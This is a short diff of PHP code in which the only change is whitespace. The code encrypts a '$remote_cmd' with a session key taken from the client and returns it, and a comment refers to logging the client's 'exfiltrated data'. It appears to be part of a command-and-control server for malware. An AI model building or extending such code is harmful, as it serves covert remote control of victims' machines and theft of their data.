@@ -311,7 +311,7 @@ if ( !$remote_client_requirements ) exit(0);
 if ( is_array($remote_client_requirements) && isset($remote_client_requirements['key']) && isset($remote_client_requirements['type']) ){
     $session_key = base64_decode($remote_client_requirements['key']);
     $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
-    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
+    $response = json_encode(array( 'payload' =>base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
     //add some fancy logging in order to know the client and type+format of exfiltrated data 
     echo $response;
 }
